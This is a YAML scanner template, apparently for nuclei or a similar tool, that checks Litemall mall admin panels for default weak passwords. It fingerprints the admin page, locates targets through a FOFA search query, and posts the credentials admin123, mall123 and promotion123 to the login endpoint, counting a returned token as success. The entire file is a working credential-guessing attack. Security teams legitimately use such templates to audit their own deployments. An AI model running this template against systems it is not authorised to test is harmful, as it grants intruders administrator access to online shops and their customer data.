id: poc-yaml-litemall-open-source-management-system-weak-password
info:
  name: Litemall开源商城管理系统 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: litemall
  fofa: app="Litemall"
variables:
  user_name: 'admin123

    mall123

    promotion123

    '
  pass_word: 'admin123

    mall123

    promotion123

    '
firstRequest:
  method: GET
  path: /
  expression: status_code == 200 && contains(body,"<title>litemall-admin</title>")
requests:
- method: POST
  path: /admin/auth/login
  headers:
    Content-Type: application/json
  data: "{\n  \"username\":\"{{.user_name}}\",\n  \"password\":\"{{.pass_word}}\"\
    ,\n  \"code\":\"\"\n}\n"
  expression: status_code == 200 && contains(body,"\"errmsg\":\"成功\"") && contains(body,"\"token\"")
    && contains(body,"\"adminInfo\"")
transport: http
